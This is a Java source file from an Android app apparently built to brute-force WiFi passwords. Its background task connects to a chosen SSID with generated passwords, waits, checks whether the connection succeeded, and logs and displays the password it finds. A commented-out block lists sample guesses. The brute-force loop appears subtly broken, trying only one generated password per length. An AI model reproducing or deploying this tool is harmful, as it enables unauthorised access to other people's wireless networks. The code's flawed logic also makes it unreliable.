package com.nguyen.wifibruteforce;

import android.app.Activity;
import android.app.ProgressDialog;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import static android.content.Context.WIFI_SERVICE;

public class BruteForceTask extends AsyncTask<String, Integer, Integer> {
    Activity activity;
    //    ProgressDialog progressDialog;
    String foundPass;

    public BruteForceTask(Activity activity) {
        this.activity = activity;
//        progressDialog = new ProgressDialog(activity);
//        progressDialog.setIndeterminate(false);
//        // Progress dialog horizontal style
//        progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
//        // Progress dialog message
//        progressDialog.setMessage("Please wait ...");

    }


    @Override
    protected void onPreExecute() {
        super.onPreExecute();
//        progressDialog.show();
    }

    @Override
    protected Integer doInBackground(String... strings) {
//        String[] test = {"88888888", "123456789", "222222", "444444444", "12345679", "deophaihoi", "thecoffeehouse"};
//        String testPass;
//        for (int i = 0; i < test.length; i++) {
//            testPass = test[i];
//            Utils.finallyConnect(testPass, strings[0], activity);
//            Log.d("pz", testPass);
//            publishProgress(i);
//
//            if (isCancelled()) {
//                Log.d("pz", "isCancelled");
//                break;
//            }
//            try {
//                Thread.sleep(9000);
//            } catch (InterruptedException e) {
//                e.printStackTrace();
//            }
//
//            WifiManager wifi = (WifiManager) activity.getApplicationContext().getSystemService(WIFI_SERVICE);
//            WifiInfo wifiInfo = wifi.getConnectionInfo();
//            if (Utils.isConnectAccessPoint(activity.getApplicationContext())
//                    && Utils.convertSSID(wifiInfo.getSSID()).equals(strings[0])) {
//                Log.d("pz", Utils.convertSSID(wifiInfo.getSSID()) + "/" + strings[0] + " /pass: " + testPass);
//                Log.d("pz", "pass is: " + testPass);
//                foundPass = testPass;
//                break;
//            }
//        }

        FindPassword bruteforce = new FindPassword();
        int count = 1;
        for (int length = bruteforce.min; length < bruteforce.max; length++) { // Change bruteforce.min and bruteforce.max for number of characters to bruteforce.
            bruteforce.generate("", 0, length); //prepend_string, pos, length
            publishProgress(count);
            count+=1;

            Utils.finallyConnect(bruteforce.getPass(), strings[0], activity);
            Log.d("pz", bruteforce.getPass());
            if (isCancelled()) {
                Log.d("pz", "isCancelled");
                break;
            }
            try {
                Thread.sleep(9000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            WifiManager wifi = (WifiManager) activity.getApplicationContext().getSystemService(WIFI_SERVICE);
            WifiInfo wifiInfo = wifi.getConnectionInfo();
            if (Utils.isConnectAccessPoint(activity.getApplicationContext())
                    && Utils.convertSSID(wifiInfo.getSSID()).equals(strings[0])) {
                Log.d("pz", Utils.convertSSID(wifiInfo.getSSID()) + "/" + strings[0] + " /pass: " + bruteforce.getPass());
                Log.d("pz", "pass is: " + bruteforce.getPass());
                foundPass = bruteforce.getPass();
                break;
            }
        }
        return null;
    }

    @Override
    protected void onProgressUpdate(Integer... values) {
        super.onProgressUpdate(values);
//        progressDialog.setProgress(values[0]);
        TextView txtPassCout = activity.findViewById(R.id.txtPassCount);
        txtPassCout.setText(values[0] + "");
    }


    @Override
    protected void onPostExecute(Integer integer) {
        super.onPostExecute(integer);
//        progressDialog.dismiss();
        Toast.makeText(activity.getApplicationContext(), "Password found: " + foundPass, Toast.LENGTH_LONG).show();
        activity.finish();
    }
}
